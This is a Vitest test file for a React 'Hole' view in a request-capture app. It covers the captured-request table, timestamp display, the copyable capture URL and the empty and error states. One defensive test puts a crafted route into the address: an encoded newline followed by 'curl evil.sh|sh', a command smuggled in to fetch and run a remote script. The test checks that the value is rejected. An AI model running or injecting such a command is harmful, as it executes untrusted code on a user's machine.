import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter, Route, Routes } from "react-router-dom";
import type { RequestObject } from "../types";
import holeService from "../services";
import { formatTimestamp } from "../utils/format";
import Hole from "./Hole";

vi.mock("../services", () => ({
  default: {
    BASE_URL: "",
    getRequests: vi.fn(),
    deleteRequest: vi.fn(),
  },
}));

// jsdom has no EventSource. The live stream is task 0006's concern; here it
// only has to exist so the component can mount.
class StubEventSource {
  onmessage: ((event: MessageEvent) => void) | null = null;
  onerror: (() => void) | null = null;
  close = vi.fn();
}
vi.stubGlobal("EventSource", StubEventSource);

const capturedRequest = (
  overrides: Partial<RequestObject> = {},
): RequestObject => ({
  request_address: "req001",
  created: "2026-07-25T14:03:22.145Z",
  method: "POST",
  request_path: "/abc123",
  query_params: '{"probe":"1"}',
  headers: '{"user-agent":"curl/8.7.1"}',
  ...overrides,
});

const renderHole = () =>
  render(
    <MemoryRouter initialEntries={["/view/abc123"]}>
      <Routes>
        <Route path="/view/:hole_address" element={<Hole />} />
      </Routes>
    </MemoryRouter>,
  );

beforeEach(() => {
  vi.mocked(holeService.getRequests).mockResolvedValue([]);
});

describe("Hole request list", () => {
  it("shows a request's query parameters in the Params column, not its headers", async () => {
    vi.mocked(holeService.getRequests).mockResolvedValue([capturedRequest()]);
    renderHole();

    expect(await screen.findByText("probe=1")).toBeVisible();
    expect(screen.queryByText(/user-agent/)).not.toBeInTheDocument();
  });

  // <td> in a <thead> gives assistive tech no column association at all.
  it("marks up its header row as column headers", async () => {
    vi.mocked(holeService.getRequests).mockResolvedValue([capturedRequest()]);
    renderHole();
    await screen.findByText("probe=1");

    const headers = screen
      .getAllByRole("columnheader")
      .map((cell) => cell.textContent);
    expect(headers).toEqual(
      expect.arrayContaining(["Method", "Path", "Params", "Created"]),
    );
  });

  it("renders the captured timestamp readably, keeping the exact value to hand", async () => {
    vi.mocked(holeService.getRequests).mockResolvedValue([capturedRequest()]);
    renderHole();
    await screen.findByText("probe=1");

    const shown = screen.getByText(formatTimestamp("2026-07-25T14:03:22.145Z"));
    expect(shown).toBeVisible();
    // Reformatting into the viewer's zone shifts the wall-clock reading, so the
    // stored UTC value stays reachable rather than being thrown away.
    expect(shown).toHaveAttribute("title", "2026-07-25T14:03:22.145Z");
    expect(
      screen.queryByText("2026-07-25T14:03:22.145Z"),
    ).not.toBeInTheDocument();
  });

  // Four cells each wrapping their own link made every row four tab stops and
  // four announcements of the same destination.
  it("gives each row a single link to the request", async () => {
    vi.mocked(holeService.getRequests).mockResolvedValue([capturedRequest()]);
    renderHole();
    await screen.findByText("probe=1");

    const rowLinks = screen
      .getAllByRole("link")
      .filter((link) => link.getAttribute("href") === "/view/abc123/req001");
    expect(rowLinks).toHaveLength(1);
  });
});

describe("Hole capture URL", () => {
  // BASE_URL is "" in production, which used to yield the bare path "/abc123".
  it("shows an absolute URL and copies that same URL", async () => {
    const user = userEvent.setup();
    vi.mocked(holeService.getRequests).mockResolvedValue([capturedRequest()]);
    renderHole();

    const shown = await screen.findByText(/\/abc123$/);
    // Pinned against a literal shape, not just against the same global the
    // component reads, so a bare path cannot pass.
    expect(shown.textContent).toMatch(/^https?:\/\/[^/]+\/abc123$/);

    await user.click(screen.getByRole("button", { name: /copy/i }));
    await expect(navigator.clipboard.readText()).resolves.toBe(
      shown.textContent,
    );
  });

  // The address comes off the route, so a crafted link can carry anything.
  it("offers nothing to copy when the address is not a real hole address", async () => {
    render(
      <MemoryRouter initialEntries={["/view/abc%0Acurl%20evil.sh%7Csh"]}>
        <Routes>
          <Route path="/view/:hole_address" element={<Hole />} />
        </Routes>
      </MemoryRouter>,
    );

    expect(await screen.findByText(/not a valid hole address/i)).toBeVisible();
    expect(
      screen.queryByRole("button", { name: /copy/i }),
    ).not.toBeInTheDocument();
  });
});

describe("Hole empty state", () => {
  it("tells the user to send a request, showing the hole's capture URL", async () => {
    renderHole();

    expect(await screen.findByText(/no requests/i)).toBeVisible();
    expect(
      screen.getAllByText(`${window.location.origin}/abc123`).length,
    ).toBeGreaterThan(0);
    expect(screen.queryByRole("table")).not.toBeInTheDocument();
  });

  // Starting from an empty array meant the designed "nothing here" panel was
  // also the first thing painted on every visit, and the last thing painted
  // after a failed load.
  it("waits for the first load rather than claiming the hole is empty", async () => {
    let resolveRequests: (requests: RequestObject[]) => void = () => {};
    vi.mocked(holeService.getRequests).mockReturnValue(
      new Promise((resolve) => {
        resolveRequests = resolve;
      }),
    );
    renderHole();

    expect(screen.queryByText(/no requests/i)).not.toBeInTheDocument();

    resolveRequests([]);
    expect(await screen.findByText(/no requests/i)).toBeVisible();
  });

  it("reports a failed load instead of claiming the hole is empty", async () => {
    vi.mocked(holeService.getRequests).mockRejectedValue(new Error("offline"));
    renderHole();

    expect(
      await screen.findByText(/couldn't load this hole's requests/i),
    ).toBeVisible();
    expect(screen.queryByText(/no requests/i)).not.toBeInTheDocument();
  });
});
